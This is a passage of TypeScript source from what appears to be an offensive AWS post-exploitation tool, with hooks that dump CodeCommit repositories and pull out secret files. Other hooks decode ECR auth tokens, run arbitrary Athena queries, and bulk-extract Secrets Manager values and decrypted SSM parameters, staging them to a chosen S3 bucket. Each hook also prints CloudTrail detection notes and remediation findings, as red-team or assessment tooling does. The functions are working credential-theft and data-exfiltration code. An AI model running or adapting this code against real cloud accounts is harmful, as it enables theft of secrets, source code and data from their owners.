  if (cfnStacks.exitCode === 0) {
    const sl = tryJson(cfnStacks.stdout) || []
    output.push(`[+] CloudFormation stacks to clean: ${sl.length}`)
    for (const s of sl) {
      if (dryRun) {
        output.push(`    Would delete: ${s[0]}`)
      } else {
        await aws(["cloudformation", "delete-stack", "--stack-name", s[0]], profile, region, timeout)
        output.push(`    Deleting: ${s[0]}`)
      }
    }
  }

  const events = await aws(
    ["events", "list-rules", "--query", "Rules[?contains(Name,'cs-')].[Name]"],
    profile,
    region,
    timeout,
  )
  if (events.exitCode === 0) {
    const el = tryJson(events.stdout) || []
    output.push(`[+] EventBridge rules to clean: ${el.length}`)
    for (const e of el) {
      if (dryRun) {
        output.push(`    Would delete: ${e[0]}`)
      } else {
        const targets = await aws(
          ["events", "list-targets-by-rule", "--rule", e[0], "--query", "Targets[].Id"],
          profile,
          region,
          timeout,
        )
        const tl = tryJson(targets.stdout) || []
        if (tl.length > 0) {
          await aws(["events", "remove-targets", "--rule", e[0], "--ids", ...tl], profile, region, timeout)
        }
        await aws(["events", "delete-rule", "--name", e[0]], profile, region, timeout)
        output.push(`    Deleted: ${e[0]}`)
      }
    }
  }

  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
  if (trails.exitCode === 0) {
    for (const t of tryJson(trails.stdout) || []) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
      const s = tryJson(status.stdout)
      if (!s?.IsLogging) {
        if (dryRun) {
          output.push(`    Would restart logging: ${t[0]}`)
        } else {
          await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
          output.push(`[+] Restarted logging: ${t[0]}`)
        }
      }
    }
  }

  output.push(`\n[*] Cleanup ${mode} complete`)
  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: DeleteSnapshot, DeleteDBSnapshot, DeleteFunction, DeleteUser, DeleteRole, DeleteStack, StartLogging`)
  output.push(`  Note: Cleanup itself generates CloudTrail events — the trail restart (StartLogging) is especially high-signal`)
  return { output: output.join("\n"), findings }
}

export async function codecommitDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const repoName = argVal(args, "--repo")
  const branch = argVal(args, "--branch")
  const findings: Finding[] = []
  const output: string[] = ["[*] CodeCommit Repository Dump\n"]

  // Pre-flight: simulate CodeCommit read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["codecommit:GitPull", "codecommit:GetRepository", "codecommit:GetFile", "codecommit:GetFolder"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[!] CodeCommit actions allowed: ${allowed.join(", ")}`)
  }

  const repos = await aws(
    ["codecommit", "list-repositories", "--query", "repositories[].[repositoryName,repositoryId]"],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: codecommit:ListRepositories", findings }

  const rl = tryJson(repos.stdout) || []
  output.push(`[+] Repositories: ${rl.length}`)

  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl

  for (const r of targets) {
    const name = r[0]
    output.push(`\n  Repository: ${name}`)

    const meta = await aws(
      [
        "codecommit",
        "get-repository",
        "--repository-name",
        name,
        "--query",
        "repositoryMetadata.{defaultBranch:defaultBranch,cloneUrl:cloneUrlHttp,lastModified:lastModifiedDate,description:repositoryDescription}",
      ],
      profile,
      region,
      timeout,
    )
    if (meta.exitCode === 0) {
      const m = tryJson(meta.stdout)
      if (m) {
        output.push(`    Default branch: ${m.defaultBranch || "N/A"}`)
        output.push(`    Clone URL: ${m.cloneUrl}`)
        output.push(`    Last modified: ${m.lastModified}`)
        if (m.description) output.push(`    Description: ${m.description}`)
      }
    }

    const branches = await aws(
      ["codecommit", "list-branches", "--repository-name", name, "--query", "branches"],
      profile,
      region,
      timeout,
    )
    if (branches.exitCode === 0) {
      const bl = tryJson(branches.stdout) || []
      output.push(`    Branches: ${bl.join(", ")}`)
    }

    const targetBranch =
      branch ||
      tryJson(
        (
          await aws(
            ["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.defaultBranch"],
            profile,
            region,
            timeout,
          )
        ).stdout,
      )
    if (targetBranch) {
      const folderContent = await aws(
        [
          "codecommit",
          "get-folder",
          "--repository-name",
          name,
          "--folder-path",
          "/",
          "--query",
          "{files:files[].relativePath,subFolders:subFolders[].relativePath}",
        ],
        profile,
        region,
        timeout,
      )
      if (folderContent.exitCode === 0) {
        const fc = tryJson(folderContent.stdout)
        if (fc) {
          output.push(`    Root files: ${(fc.files || []).join(", ")}`)
          output.push(`    Directories: ${(fc.subFolders || []).join(", ")}`)

          const secretFiles = [
            ".env",
            ".env.production",
            "config.json",
            "secrets.json",
            "credentials",
            ".aws/credentials",
            "docker-compose.yml",
            "terraform.tfvars",
            "*.pem",
            "*.key",
          ]
          const foundSecrets = (fc.files || []).filter((f: string) =>
            secretFiles.some((s) => f.toLowerCase().includes(s.replace("*.", ".")) || f.toLowerCase() === s),
          )
          if (foundSecrets.length) {
            output.push(`    [!] Potential secret files: ${foundSecrets.join(", ")}`)
            for (const sf of foundSecrets) {
              const content = await aws(
                ["codecommit", "get-file", "--repository-name", name, "--file-path", sf, "--query", "fileContent"],
                profile,
                region,
                timeout,
              )
              if (content.exitCode === 0) {
                const decoded = Buffer.from(tryJson(content.stdout) || "", "base64").toString()
                output.push(`\n    --- ${sf} ---`)
                output.push(`    ${decoded.slice(0, 500)}`)
                if (decoded.length > 500) output.push(`    ... (${decoded.length} bytes total)`)
                findings.push({
                  checkId: "AWS-EXFIL-005",
                  provider: "aws",
                  severity: "critical",
                  status: "EXTRACTED",
                  resource: `codecommit:${name}:${sf}`,
                  title: `Secret file extracted from repo: ${name}/${sf}`,
                  details: `File content: ${decoded.slice(0, 80)}...`,
                  remediation: "Rotate all credentials in file, remove from repository, add to .gitignore",
                })
              }
            }
          }
        }
      }

      output.push(
        `\n    [*] Clone command: git clone ${tryJson((await aws(["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.cloneUrlHttp"], profile, region, timeout)).stdout) || name}`,
      )

      findings.push({
        checkId: "AWS-EXFIL-006",
        provider: "aws",
        severity: "high",
        status: "ACCESSIBLE",
        resource: `codecommit:${name}`,
        title: `CodeCommit repository accessible: ${name}`,
        details: "Repository can be cloned — source code may contain hardcoded secrets, business logic, internal APIs",
        remediation: "Restrict codecommit:GitPull and codecommit:GetFile permissions",
      })
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: GitPull, GetFile, GetFolder, GetRepository, ListRepositories`)
  output.push(`  Note: CodeCommit Git operations (clone/pull) are logged as GitPull events — unusual for non-developer accounts`)
  return { output: output.join("\n"), findings }
}

export async function ecrDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const repoName = argVal(args, "--repository")
  const pullImage = hasFlag(args, "--pull")
  const findings: Finding[] = []
  const output: string[] = ["[*] ECR Container Image Dump\n"]

  // Pre-flight: simulate ECR pull permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["ecr:GetDownloadUrlForLayer", "ecr:BatchGetImage", "ecr:GetAuthorizationToken"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[!] ECR pull actions allowed: ${allowed.join(", ")}`)
  }

  const repos = await aws(
    [
      "ecr",
      "describe-repositories",
      "--query",
      "repositories[].[repositoryName,repositoryUri,repositoryArn,imageScanningConfiguration.scanOnPush,imageTagMutability]",
    ],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: ecr:DescribeRepositories", findings }

  const rl = tryJson(repos.stdout) || []
  output.push(`[+] ECR Repositories: ${rl.length}`)

  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl

  for (const r of targets) {
    const name = r[0]
    output.push(`\n  Repository: ${name}`)
    output.push(`    URI: ${r[1]}`)
    output.push(`    Scan on push: ${r[3]}  Tag mutability: ${r[4]}`)

    const policy = await aws(
      ["ecr", "get-repository-policy", "--repository-name", name, "--query", "policyText"],
      profile,
      region,
      timeout,
    )
    if (policy.exitCode === 0) {
      const p = tryJson(policy.stdout)
      const pStr = typeof p === "string" ? p : JSON.stringify(p)
      if (pStr.includes('"*"') || pStr.includes('"AWS":"*"')) {
        output.push(`    [!] Repository policy allows public access`)
        findings.push({
          checkId: "AWS-EXFIL-007",
          provider: "aws",
          severity: "high",
          status: "OPEN",
          resource: `ecr:${name}`,
          title: `ECR repo with public access policy: ${name}`,
          details: "Repository policy allows cross-account or public image pull",
          remediation: "Restrict ECR repository policy",
        })
      }
    }

    const images = await aws(
      [
        "ecr",
        "describe-images",
        "--repository-name",
        name,
        "--query",
        "imageDetails | sort_by(@, &imagePushedAt) | reverse(@) | [0:10].[{tags:imageTags,digest:imageDigest,size:imageSizeInBytes,pushed:imagePushedAt,vulns:imageScanFindingsSummary.findingSeverityCounts}]",
      ],
      profile,
      region,
      timeout,
    )
    if (images.exitCode === 0) {
      const il = tryJson(images.stdout) || []
      output.push(`    Images (latest 10):`)
      for (const img of il) {
        const i = img[0] || img
        const sizeMB = Math.round((i.size || 0) / 1024 / 1024)
        const tags = (i.tags || []).join(", ") || "untagged"
        output.push(`      ${tags}  Size: ${sizeMB}MB  Pushed: ${i.pushed}`)
        if (i.vulns) {
          output.push(
            `        Vulns: Critical=${i.vulns.CRITICAL || 0} High=${i.vulns.HIGH || 0} Medium=${i.vulns.MEDIUM || 0}`,
          )
        }
      }
    }

    const lifecycle = await aws(
      ["ecr", "get-lifecycle-policy", "--repository-name", name, "--query", "lifecyclePolicyText"],
      profile,
      region,
      timeout,
    )
    if (lifecycle.exitCode === 0) {
      output.push(`    Lifecycle policy: configured`)
    }

    findings.push({
      checkId: "AWS-EXFIL-008",
      provider: "aws",
      severity: "high",
      status: "ACCESSIBLE",
      resource: `ecr:${name}`,
      title: `ECR repository accessible: ${name}`,
      details: `URI: ${r[1]} — images may contain embedded secrets, API keys, service credentials in env vars or config files`,
      remediation: "Restrict ecr:GetAuthorizationToken and ecr:BatchGetImage permissions",
    })
  }

  if (pullImage && repoName) {
    const token = await aws(
      [
        "ecr",
        "get-authorization-token",
        "--query",
        "authorizationData[0].{token:authorizationToken,endpoint:proxyEndpoint}",
      ],
      profile,
      region,
      timeout,
    )
    if (token.exitCode === 0) {
      const t = tryJson(token.stdout)
      if (t) {
        const decoded = Buffer.from(t.token, "base64").toString()
        const parts = decoded.split(":")
        output.push(`\n[+] ECR Auth for pull:`)
        output.push(`    docker login -u ${parts[0]} -p ${parts[1]?.slice(0, 20)}... ${t.endpoint}`)
        output.push(`    docker pull ${targets[0]?.[1]}:latest`)
      }
    }
  } else {
    output.push(`\n[*] Use --repository NAME --pull to get auth token for image pull`)
  }

  const publicRepos = await aws(
    ["ecr-public", "describe-repositories", "--query", "repositories[].[repositoryName,repositoryUri]"],
    profile,
    region,
    timeout,
  )
  if (publicRepos.exitCode === 0) {
    const prl = tryJson(publicRepos.stdout) || []
    if (prl.length) {
      output.push(`\n[+] Public ECR Repositories: ${prl.length}`)
      for (const pr of prl) output.push(`  ${pr[0]}  URI: ${pr[1]}`)
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: GetAuthorizationToken, BatchGetImage, GetDownloadUrlForLayer, DescribeRepositories`)
  output.push(`  Note: ECR auth token + image pull from unusual identity is high-signal — images may contain embedded secrets`)
  return { output: output.join("\n"), findings }
}

export async function athenaQuery(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const query = argVal(args, "--query-string")
  const database = argVal(args, "--database")
  const outputBucket = argVal(args, "--output-bucket")
  const findings: Finding[] = []
  const output: string[] = ["[*] Athena Data Lake Query\n"]

  // Pre-flight: simulate Athena query permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["athena:StartQueryExecution", "athena:GetQueryResults", "glue:GetTable", "s3:GetObject"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[!] Athena/Glue actions allowed: ${allowed.join(", ")}`)
  }

  const catalogs = await aws(
    ["athena", "list-data-catalogs", "--query", "DataCatalogsSummary[].[CatalogName,Type]"],
    profile,
    region,
    timeout,
  )
  if (catalogs.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: athena:ListDataCatalogs", findings }

  const cl = tryJson(catalogs.stdout) || []
  output.push(`[+] Data catalogs: ${cl.length}`)
  for (const c of cl) output.push(`  ${c[0]}  Type: ${c[1]}`)

  const databases = await aws(
    ["athena", "list-databases", "--catalog-name", "AwsDataCatalog", "--query", "DatabaseList[].[Name,Description]"],
    profile,
    region,
    timeout,
  )
  if (databases.exitCode === 0) {
    const dl = tryJson(databases.stdout) || []
    output.push(`\n[+] Databases (Glue catalog): ${dl.length}`)
    for (const d of dl) {
      output.push(`  ${d[0]}${d[1] ? ` — ${d[1]}` : ""}`)

      const tables = await aws(
        [
          "athena",
          "list-table-metadata",
          "--catalog-name",
          "AwsDataCatalog",
          "--database-name",
          d[0],
          "--query",
          "TableMetadataList[].[Name,TableType,Columns | length(@)]",
        ],
        profile,
        region,
        timeout,
      )
      if (tables.exitCode === 0) {
        const tl = tryJson(tables.stdout) || []
        for (const t of tl) output.push(`    Table: ${t[0]}  Type: ${t[1]}  Columns: ${t[2]}`)
      }
    }
  }

  const workgroups = await aws(
    ["athena", "list-work-groups", "--query", "WorkGroups[].[Name,State,EngineVersion.EffectiveEngineVersion]"],
    profile,
    region,
    timeout,
  )
  if (workgroups.exitCode === 0) {
    const wl = tryJson(workgroups.stdout) || []
    output.push(`\n[+] Workgroups: ${wl.length}`)
    for (const w of wl) {
      output.push(`  ${w[0]}  State: ${w[1]}  Engine: ${w[2]}`)

      const wgDetail = await aws(
        [
          "athena",
          "get-work-group",
          "--work-group",
          w[0],
          "--query",
          "WorkGroup.Configuration.ResultConfiguration.OutputLocation",
        ],
        profile,
        region,
        timeout,
      )
      if (wgDetail.exitCode === 0) {
        const loc = tryJson(wgDetail.stdout)
        if (loc) output.push(`    Output: ${loc}`)
      }
    }
  }

  const recent = await aws(
    ["athena", "list-query-executions", "--work-group", "primary", "--query", "QueryExecutionIds[0:5]"],
    profile,
    region,
    timeout,
  )
  if (recent.exitCode === 0) {
    const ids = tryJson(recent.stdout) || []
    if (ids.length) {
      output.push(`\n[+] Recent queries:`)
      for (const id of ids) {
        const detail = await aws(
          [
            "athena",
            "get-query-execution",
            "--query-execution-id",
            id,
            "--query",
            "QueryExecution.{query:Query,status:Status.State,submitted:Status.SubmissionDateTime,output:ResultConfiguration.OutputLocation}",
          ],
          profile,
          region,
          timeout,
        )
        if (detail.exitCode === 0) {
          const d = tryJson(detail.stdout)
          if (d) {
            output.push(`  [${d.status}] ${String(d.query).slice(0, 100)}`)
            if (d.output) output.push(`    Output: ${d.output}`)
          }
        }
      }
    }
  }

  if (!query) {
    output.push(`\n[*] Usage: awshook athena_query --query-string "SELECT * FROM db.table LIMIT 10" --database mydb`)
    output.push(`[*] Results written to workgroup's S3 output location`)
    findings.push({
      checkId: "AWS-EXFIL-009",
      provider: "aws",
      severity: "high",
      status: "ACCESSIBLE",
      resource: "athena:catalog",
      title: "Athena data catalog accessible — S3 data lake queryable",
      details: "Can run SQL queries against S3 data via Glue catalog tables",
      remediation: "Restrict athena:StartQueryExecution and glue:GetTable permissions",
    })
    return { output: output.join("\n"), findings }
  }

  const outputLoc = outputBucket ? `s3://${outputBucket}/athena-results/` : undefined
  const execArgs = [
    "athena",
    "start-query-execution",
    "--query-string",
    query,
    ...(database ? ["--query-execution-context", `Database=${database}`] : []),
    ...(outputLoc ? ["--result-configuration", `OutputLocation=${outputLoc}`] : []),
  ]

  const exec = await aws(execArgs, profile, region, timeout)
  if (exec.exitCode !== 0) {
    output.push(`\n[-] Query failed: ${exec.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const execId = tryJson(exec.stdout)?.QueryExecutionId
  output.push(`\n[+] Query submitted: ${execId}`)

  let queryStatus = "RUNNING"
  for (let i = 0; i < 30 && (queryStatus === "RUNNING" || queryStatus === "QUEUED"); i++) {
    await new Promise((r) => setTimeout(r, 2000))
    const check = await aws(
      ["athena", "get-query-execution", "--query-execution-id", execId, "--query", "QueryExecution.Status.State"],
      profile,
      region,
      timeout,
    )
    queryStatus = tryJson(check.stdout) || "UNKNOWN"
  }

  if (queryStatus === "SUCCEEDED") {
    const results = await aws(
      ["athena", "get-query-results", "--query-execution-id", execId, "--max-items", "20"],
      profile,
      region,
      timeout,
    )
    if (results.exitCode === 0) {
      const r = tryJson(results.stdout)
      const rows = r?.ResultSet?.Rows || []
      output.push(`[+] Query succeeded — ${rows.length} rows returned:`)
      for (const row of rows.slice(0, 20)) {
        const vals = (row.Data || []).map((d: Record<string, string>) => d.VarCharValue || "null")
        output.push(`  ${vals.join(" | ")}`)
      }
      findings.push({
        checkId: "AWS-EXFIL-010",
        provider: "aws",
        severity: "critical",
        status: "EXTRACTED",
        resource: `athena:query:${execId}`,
        title: `Athena query executed: ${query.slice(0, 60)}`,
        details: `${rows.length} rows returned from data lake query`,
        remediation: "Review athena:StartQueryExecution permissions and data access patterns",
      })
    }
  } else {
    output.push(`[-] Query status: ${queryStatus}`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: StartQueryExecution, GetQueryResults, GetQueryExecution`)
  output.push(`  Note: Query text is logged in CloudTrail — reveals attacker intent; results written to S3 generate data events`)
  return { output: output.join("\n"), findings }
}

export async function secretsBulkExport(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const destBucket = argVal(args, "--dest-bucket")
  const format = argVal(args, "--format") || "json"
  const findings: Finding[] = []
  const output: string[] = ["[*] Secrets Bulk Export (Secrets Manager + SSM Parameter Store)\n"]

  // Pre-flight: simulate secrets access — MAXIMUM signal actions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets", "ssm:GetParameter", "ssm:GetParametersByPath"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) {
      output.push(`[!] Secret access actions allowed: ${allowed.join(", ")}`)
      findings.push({ checkId: "AWS-EXFIL-SECRETS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Bulk secret access permitted: ${allowed.join(", ")}`, details: `Can read secrets from Secrets Manager and SSM Parameter Store`, remediation: "Restrict secretsmanager:GetSecretValue and ssm:GetParameter to application-specific resources" })
    }
  }

  const secrets: Record<string, string> = {}

  const smList = await aws(
    ["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN,Description,LastChangedDate]"],
    profile,
    region,
    timeout,
  )
  if (smList.exitCode === 0) {
    const sl = tryJson(smList.stdout) || []
    output.push(`[+] Secrets Manager secrets: ${sl.length}`)

    for (const s of sl) {
      const val = await aws(
        [
          "secretsmanager",
          "get-secret-value",
          "--secret-id",
          s[1],
          "--query",
          "{value:SecretString,binary:SecretBinary}",
        ],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout)
        const secretVal = v?.value || (v?.binary ? `[binary:${v.binary.length}bytes]` : "[empty]")
        secrets[`sm://${s[0]}`] = secretVal
        output.push(`  [+] ${s[0]}: ${String(secretVal).slice(0, 60)}...`)
      } else {
        output.push(`  [-] ${s[0]}: access denied`)
      }
    }
  }

  const ssmParams = await aws(
    ["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type,LastModifiedDate,Description]"],
    profile,
    region,
    timeout,
  )
  if (ssmParams.exitCode === 0) {
    const pl = tryJson(ssmParams.stdout) || []
    const secureParams = pl.filter((p: string[]) => p[1] === "SecureString")
    const plainParams = pl.filter((p: string[]) => p[1] !== "SecureString")

    output.push(`\n[+] SSM Parameters: ${pl.length} (${secureParams.length} SecureString, ${plainParams.length} other)`)

    for (const p of secureParams) {
      const val = await aws(
        ["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout) || val.stdout.trim()
        secrets[`ssm://${p[0]}`] = v
        output.push(`  [+] ${p[0]} (SecureString): ${String(v).slice(0, 60)}...`)
      } else {
        output.push(`  [-] ${p[0]}: decryption denied (missing KMS access)`)
      }
    }

    const secretPattern = /(?:password|secret|key|token|api.?key|credential|private|auth|db.?pass|connection)/i
    const interestingPlain = plainParams.filter((p: string[]) => secretPattern.test(p[0]))
    for (const p of interestingPlain) {
      const val = await aws(
        ["ssm", "get-parameter", "--name", p[0], "--query", "Parameter.Value"],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout) || val.stdout.trim()
        secrets[`ssm://${p[0]}`] = v
        output.push(`  [+] ${p[0]} (${p[1]}): ${String(v).slice(0, 60)}...`)
      }
    }
  }

  const count = Object.keys(secrets).length
  output.push(`\n[+] Total secrets extracted: ${count}`)

  if (count === 0) return { output: output.join("\n"), findings }

  findings.push({
    checkId: "AWS-EXFIL-011",
    provider: "aws",
    severity: "critical",
    status: "EXTRACTED",
    resource: "secrets:bulk",
    title: `${count} secrets bulk extracted`,
    details: `${Object.keys(secrets).slice(0, 10).join(", ")}${count > 10 ? ` and ${count - 10} more` : ""}`,
    remediation: "Rotate all extracted secrets immediately, restrict IAM permissions for secret access",
  })

  if (destBucket) {
    const exportData =
      format === "json"
        ? JSON.stringify(secrets, null, 2)
        : Object.entries(secrets)
            .map(([k, v]) => `${k}=${v}`)
            .join("\n")

    const tmpDir = process.env.TMPDIR || "/tmp"
    const tmpFile = `${tmpDir}/cs-secrets-export.${format === "json" ? "json" : "env"}`
    await Bun.write(tmpFile, exportData)
    try {
      const key = `secrets-export-${Date.now().toString(36)}.${format === "json" ? "json" : "env"}`
      const upload = await aws(["s3", "cp", tmpFile, `s3://${destBucket}/${key}`], profile, region, timeout)
      if (upload.exitCode === 0) {
        output.push(`[+] Exported to s3://${destBucket}/${key}`)
        findings.push({
          checkId: "AWS-EXFIL-012",
          provider: "aws",
          severity: "critical",
          status: "STAGED",
          resource: `s3:${destBucket}:${key}`,
          title: `Secrets staged to S3: ${destBucket}/${key}`,
          details: `${count} secrets exported as ${format}`,
          remediation: `Delete: aws s3 rm s3://${destBucket}/${key}`,
        })
      }
    } finally {
      const { unlink } = await import("node:fs/promises")
      await unlink(tmpFile).catch(() => {})
    }
  } else {
    output.push(`\n[*] Use --dest-bucket BUCKET to stage secrets to S3 for extraction`)
    output.push(`[*] Use --format env for KEY=VALUE format (default: json)`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: GetSecretValue, ListSecrets, GetParameter, DescribeParameters`)
  output.push(`  GuardDuty: CredentialAccess:IAMUser/AnomalousBehavior`)
  output.push(`  Note: GetSecretValue is MAXIMUM signal — bulk access from unusual identity triggers immediate alerts`)
  return { output: output.join("\n"), findings }
}

export async function backupVaultEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating AWS Backup vaults...\n"]

  // Pre-flight: simulate backup vault access
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["backup:ListRecoveryPointsByBackupVault", "backup:GetRecoveryPointRestoreMetadata", "backup:StartRestoreJob"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.some((a: string) => a === "backup:StartRestoreJob")) {
      output.push(`[!] Can start restore jobs — backup data exfiltration possible`)
      findings.push({ checkId: "AWS-EXFIL-BACKUP-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Backup restore permitted — can restore and exfil backed up data`, details: `Allowed: ${allowed.join(", ")}`, remediation: "Restrict backup:StartRestoreJob to recovery-specific roles" })
    }
  }

  const r = await aws(
    [
      "backup",
      "list-backup-vaults",
      "--query",
      "BackupVaultList[].{Name:BackupVaultName,Arn:BackupVaultArn,Points:NumberOfRecoveryPoints,Encrypted:EncryptionKeyArn}",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Cannot list backup vaults: ${r.stderr.trim()}`, findings }
  const vaults = tryJson(r.stdout) || []
  output.push(`[+] Backup vaults: ${vaults.length}\n`)

  for (const v of vaults) {
    output.push(`── ${v.Name} ──`)
    output.push(`    Recovery points: ${v.Points || 0}`)
    output.push(`    Encryption key: ${v.Encrypted || "NONE"}`)

    if (!v.Encrypted) {
      findings.push({
        checkId: "AWS-BACKUP-001",
        provider: "aws",
        severity: "high",
        status: "FAIL",
        resource: v.Name,
        title: `Backup vault without encryption: ${v.Name}`,
        details: `Vault ${v.Name} has no KMS encryption key configured`,
        remediation: "Configure KMS encryption for the backup vault",
      })
    }

    const policy = await aws(
      ["backup", "get-backup-vault-access-policy", "--backup-vault-name", v.Name],
      profile,
      region,
      timeout,
    )
    if (policy.exitCode === 0) {
      const p = tryJson(policy.stdout)
      const policyDoc = p?.Policy ? tryJson(p.Policy) : null
      if (policyDoc) {
        const statements = policyDoc.Statement || []
        for (const s of statements) {
          const principal = JSON.stringify(s.Principal || {})
          if (principal.includes("*") && s.Effect === "Allow") {
            output.push(`    [!] OPEN ACCESS POLICY — Principal: *`)
            findings.push({
              checkId: "AWS-BACKUP-002",
              provider: "aws",
              severity: "critical",
              status: "FAIL",
              resource: v.Name,
              title: `Backup vault with wildcard principal: ${v.Name}`,
              details: `Vault policy allows access to Principal: * — cross-account or public access`,
              remediation: "Restrict vault access policy to specific accounts/principals",
            })
          }
        }
      }
    }

    if ((v.Points || 0) > 0) {
      const rp = await aws(
        [
          "backup",
          "list-recovery-points-by-backup-vault",
          "--backup-vault-name",
          v.Name,
          "--query",
          "RecoveryPoints[].{Type:ResourceType,Created:CreationDate,Status:Status}",
          "--max-results",
          "20",
        ],
        profile,
        region,
        timeout,
      )
      if (rp.exitCode === 0) {
        const points = tryJson(rp.stdout) || []
        const types = [...new Set(points.map((p: Record<string, string>) => p.Type))]
        output.push(`    Resource types: ${types.join(", ")}`)
        for (const p of points.slice(0, 10)) {
          output.push(`      ${p.Type} — ${p.Created} (${p.Status})`)
        }
        if (points.length > 10) output.push(`      ... and ${points.length - 10} more`)
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListBackupVaults, ListRecoveryPointsByBackupVault, GetBackupVaultAccessPolicy, StartRestoreJob`)
  output.push(`  Note: Backup vault enumeration + restore job is high-signal for data exfil via backup recovery`)
  return { output: output.join("\n"), findings }
}

export async function cloudwatchLogsDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const logGroup = argVal(args, "--log-group")
  const maxGroups = parseInt(argVal(args, "--max-groups") || "10")
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudWatch Logs extraction...\n"]

  // Pre-flight: simulate CloudWatch Logs read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["logs:GetLogEvents", "logs:FilterLogEvents", "logs:DescribeLogGroups", "logs:DescribeLogStreams"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[!] Log access actions allowed: ${allowed.join(", ")}`)
  }

  const secretPattern =
    /(?:password|passwd|secret|api[_-]?key|token|bearer|authorization|aws_secret|private[_-]?key|connection[_-]?string|database_url|mongodb|postgres:\/\/|mysql:\/\/|redis:\/\/)/i

  const groups: string[] = []
